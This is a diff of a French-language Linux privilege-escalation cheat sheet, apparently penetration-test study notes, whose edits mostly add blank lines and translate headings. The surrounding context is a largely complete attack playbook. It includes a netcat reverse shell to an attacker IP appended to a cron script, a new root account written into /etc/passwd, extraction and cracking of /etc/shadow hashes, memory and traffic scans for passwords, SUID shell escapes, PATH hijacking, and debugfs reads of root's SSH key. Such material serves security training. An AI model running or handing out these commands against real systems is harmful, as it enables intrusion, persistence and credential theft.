@@ -18,6 +18,7 @@ Examiner les permissions, processus et configurations d'un système Linux.
 
 ```text
 id
+
 ```
 
 
@@ -28,6 +29,7 @@ id
 
 ```text
 hostname
+
 ```
 
 
@@ -38,11 +40,13 @@ hostname
 
 ```text
 cat /etc/issue
+
 ```
 
 
 ```text
 cat /etc/os-release
+
 ```
 
 
@@ -50,6 +54,7 @@ cat /etc/os-release
 
 ```text
 uname -a
+
 ```
 
 
@@ -60,6 +65,7 @@ uname -a
 
 ```text
 ps aux
+
 ```
 
 
@@ -70,6 +76,7 @@ ps aux
 
 ```text
 ip a
+
 ```
 
 
@@ -77,6 +84,7 @@ ip a
 
 ```text
 ss -anp
+
 ```
 
 
@@ -87,6 +95,7 @@ ss -anp
 
 ```text
 cat /etc/iptables/rules.v4
+
 ```
 
 
@@ -97,6 +106,7 @@ cat /etc/iptables/rules.v4
 
 ```text
 ls -lah /etc/cron*
+
 ```
 
 
@@ -104,11 +114,14 @@ ls -lah /etc/cron*
 
 ```text
 crontab -l
+
 ```
 
 
 ```bash
+# Examiner les tâches cron
 sudo crontab -l
+
 ```
 
 
@@ -119,6 +132,7 @@ sudo crontab -l
 
 ```text
 dpkg -l
+
 ```
 
 
@@ -133,6 +147,7 @@ dpkg -l
 
 ```text
 find / -writable -type d 2>/dev/null
+
 ```
 
 
@@ -143,6 +158,7 @@ find / -writable -type d 2>/dev/null
 
 ```text
 strings /dev/mem -n10 | grep -i PASS
+
 ```
 
 
@@ -153,6 +169,7 @@ strings /dev/mem -n10 | grep -i PASS
 
 ```text
 locate password | more
+
 ```
 
 
@@ -163,6 +180,7 @@ locate password | more
 
 ```text
 cat /etc/fstab
+
 ```
 
 
@@ -170,6 +188,7 @@ cat /etc/fstab
 
 ```text
 mount
+
 ```
 
 
@@ -177,6 +196,7 @@ mount
 
 ```text
 lsblk
+
 ```
 
 
@@ -187,6 +207,7 @@ lsblk
 
 ```text
 lsmod
+
 ```
 
 
@@ -194,6 +215,7 @@ lsmod
 
 ```text
 /sbin/modinfo <driver_name>
+
 ```
 
 
@@ -204,6 +226,7 @@ lsmod
 
 ```text
 find / -perm -u=s -type f 2>/dev/null
+
 ```
 
 
@@ -211,6 +234,7 @@ find / -perm -u=s -type f 2>/dev/null
 
 ```bash
 sudo -l
+
 ```
 
 
@@ -218,6 +242,7 @@ sudo -l
 
 ```bash
 sudo -i
+
 ```
 
 
@@ -235,6 +260,7 @@ sudo -i
 
 ```bash
 watch -n 1 "ps -aux | grep pass"
+
 ```
 
 
@@ -245,14 +271,18 @@ watch -n 1 "ps -aux | grep pass"
 
 
 ```bash
+# Capturer le trafic réseau
 sudo tcpdump -i lo -A | grep "pass"
+
 ```
 
 
 ```bash
+# Capturer le trafic réseau
 tcpdump -i any -s0 -w capture.pcap
 tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
 tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
+
 ```
 
 
@@ -267,6 +297,7 @@ Examiner les permissions et la configuration de Linux.
 grep "CRON" /var/log/syslog
 # Autre possibilité
 cat /var/log/cron.log
+
 ```
 
 
@@ -274,6 +305,7 @@ cat /var/log/cron.log
 
 ```bash
 ls -lah /path/to/script.sh
+
 ```
 
 
@@ -281,6 +313,7 @@ ls -lah /path/to/script.sh
 
 ```bash
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [listener_port] >/tmp/f" >> /path/to/script.sh
+
 ```
 
 
@@ -299,6 +332,7 @@ cat /etc/cron.deny
 cat /etc/crontab
 cat /etc/anacrontab
 cat /var/spool/cron/crontabs/root
+
 ```
 
 
@@ -309,6 +343,7 @@ cat /var/spool/cron/crontabs/root
 
 ```bash
 openssl passwd Password123
+
 ```
 
 
@@ -321,6 +356,7 @@ openssl passwd Password123
 ```bash
 # Ce n'est qu'un exemple en utilisant la sortie de la commande précédente.
 echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash">> /etc/passwd
+
 ```
 
 
@@ -331,6 +367,7 @@ su newroot
 
 # Vérifier l'accès racine
 id
+
 ```
 
 
@@ -341,6 +378,7 @@ id
 
 ```bash
 cat /etc/shadow | grep [root_user] > [root_user]_hash.txt
+
 ```
 
 
@@ -352,6 +390,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt [root_user]_hash.txt
 
 # Hashcat, nous devons isoler la partie de hachage, par exemple du hachage supérieur serait: $6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0
 hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt
+
 ```
 
 
@@ -361,6 +400,7 @@ john --show [root_user]_hash.txt
 
 # Hashcat
 hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt --show
+
 ```
 
 
@@ -371,6 +411,7 @@ hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt --show
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
+
 ```
 
 
@@ -378,6 +419,7 @@ find / -perm -4000 -type f 2>/dev/null
 
 ```bash
 ls -l $(find / -perm -4000 -type f 2>/dev/null)
+
 ```
 
 
@@ -388,6 +430,7 @@ ls -l $(find / -perm -4000 -type f 2>/dev/null)
 
 ```bash
 ps u -C [binary_name]
+
 ```
 
 
@@ -395,6 +438,7 @@ ps u -C [binary_name]
 
 ```bash
 cat /proc/[PID]/status | grep Uid
+
 ```
 
 
@@ -406,12 +450,14 @@ cat /proc/[PID]/status | grep Uid
 
 ```bash
 find [directory] -exec [path_to_shell] \;
+
 ```
 
 
 ```bash
 # Remplacer [vulnerable_binary] par le nom du binaire que vous ciblez.
 find / -name [vulnerable_binary] -exec /bin/bash -p \;
+
 ```
 
 
@@ -422,6 +468,7 @@ find / -name [vulnerable_binary] -exec /bin/bash -p \;
 
 ```bash
 /usr/sbin/getcap -r / 2>/dev/null
+
 ```
 
 
@@ -432,6 +479,7 @@ getcap [binary_path]
 
 # Par exemple
 getcap /usr/bin/nmap
+
 ```
 
 
@@ -442,6 +490,7 @@ setcap [capabilities] [binary_path]
 
 # Exemple pour ajouter CAP_DAC_OVERRIDE à un binaire
 setcap cap_dac_override=eip /path/to/binary
+
 ```
 
 
@@ -450,6 +499,7 @@ setcap -r [binary_path]
 
 # Par exemple
 setcap -r /usr/bin/nmap
+
 ```
 
 
@@ -516,6 +566,7 @@ Examiner les permissions et la configuration de Linux.
 
 ```bash
 sudo -l
+
 ```
 
 
@@ -523,6 +574,7 @@ sudo -l
 
 ```bash
 grep [process_name] /var/log/syslog
+
 ```
 
 
@@ -609,6 +661,7 @@ DirtyPipe · Linux Kernel 5.8 < 5.16.11 · Exploit
 
 ```bash
 ls /var/log/*
+
 ```
 
 
@@ -617,6 +670,7 @@ ls /var/log/*
 ```bash
 # Exemple de script vulnérable
 tar -cvf archive.tar.gz /var/log/*
+
 ```
 
 
@@ -627,6 +681,7 @@ tar -cvf archive.tar.gz /var/log/*
 
 ```bash
 touch /tmp/file_*
+
 ```
 
 
@@ -635,6 +690,7 @@ touch /tmp/file_*
 ```bash
 # Si un attaquant peut modifier des fichiers dans /etc/, il peut exploiter le wildcard pour écraser ou manipuler des fichiers de configuration critiques.
 cp /etc/* /tmp/backup/
+
 ```
 
 
@@ -650,6 +706,7 @@ debugfs: cd /root
 debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
+
 ```
 
 
@@ -663,6 +720,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 ```sql
 select sys_exec('whoami');
 select sys_eval('whoami');
+
 ```
 
 
@@ -679,6 +737,7 @@ select sys_eval('whoami');
 /home
 /var/
 /usr/src/
+
 ```
 
 
@@ -693,6 +752,7 @@ rpm -qa
 
 # OpenBSD/FreeBSD
 pkg_info
+
 ```
 
 
@@ -715,6 +775,7 @@ username:root
 username:admin
 username:qwerty
 username:password
+
 ```
 
 
@@ -724,6 +785,7 @@ username:password
 # Anything interesting in the mail folder?
 /var/mail
 /var/spool/mail
+
 ```
 
 
@@ -731,6 +793,7 @@ username:password
 
 ```bash
 ./LinEnum.sh -t -k password
+
 ```
 
 
@@ -743,6 +806,7 @@ username:password
 # Liste des services de réseau
 netstat -anlp
 netstat -ano
+
 ```
 
 
@@ -762,6 +826,7 @@ find / -perm -o x -type d 2>/dev/null
 
 # World-writable and executable directories
 find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+
 ```
 
 
@@ -773,10 +838,11 @@ find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
 ```bash
 mount -l
 cat /etc/fstab
+
 ```
 
 
-## SUID and GUID Files
+## Fichiers SUID et SGID
 
 Examiner les permissions et la configuration de Linux.
 
@@ -786,7 +852,7 @@ Examiner les permissions et la configuration de Linux.
 Examiner les permissions et la configuration de Linux.
 
 
-### Finding SUID and GUID Files
+### Rechercher les fichiers SUID et SGID
 
 Examiner les permissions et la configuration de Linux.
 
@@ -799,6 +865,7 @@ find / -perm -u=s -type f 2>/dev/null
 
 # Trouver des fichiers GUID
 find / -perm -g=s -type f 2>/dev/null
+
 ```
 
 
@@ -824,6 +891,7 @@ export PATH=/tmp:$PATH
 
 # Exécutez le programme vulnérable SUID
 /path/to/suid-program
+
 ```
 
 
@@ -834,12 +902,14 @@ export PATH=/tmp:$PATH
 find / -perm -u=s -writable -type f 2>/dev/null
 
 # Si un binaire SUID en écriture est trouvé, vous pouvez injecter votre propre code et l'exécuter avec des privilèges élevés.
+
 ```
 
 
 ```bash
 # Trouver des scripts dans cronjobs ou répertoires système qui peuvent avoir SUID ou GUID ensemble
 find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2>/dev/null
+
 ```
 
 
@@ -854,6 +924,7 @@ find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2>/dev/null
 
 ```bash
 ./linpeas.sh | tee linpeas_output.txt
+
 ```
 
 
@@ -870,6 +941,7 @@ python3 json2html.py peass.json peass.html
 
 # (Optional) We could also convert it to PDF.
 python3 json2pdf.py peass.json peass.pdf
+
 ```
 
 
@@ -883,11 +955,13 @@ python3 json2pdf.py peass.json peass.pdf
 
 # Rechercher les mots de passe
 ./LinEnum.sh -t -k password
+
 ```
 
 
 ```bash
 ./LinEnum.sh | tee linenum_output.txt
+
 ```
 
 
@@ -902,6 +976,7 @@ python3 json2pdf.py peass.json peass.pdf
 
 ```bash
 ./unix-privesc-check.sh | tee unix_privesc_check_output.txt
+
 ```
 
 
@@ -912,6 +987,7 @@ python3 json2pdf.py peass.json peass.pdf
 
 ```bash
 checksec --all
+
 ```
 
 
@@ -922,16 +998,18 @@ checksec --all
 
 ```bash
 peepdf.py file.pdf
+
 ```
 
 
-### Exploit Suggester
+### Outil de recherche de vulnérabilités
 
 
 <p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```bash
 python3 exploit-suggester.py
+
 ```
 
 ---
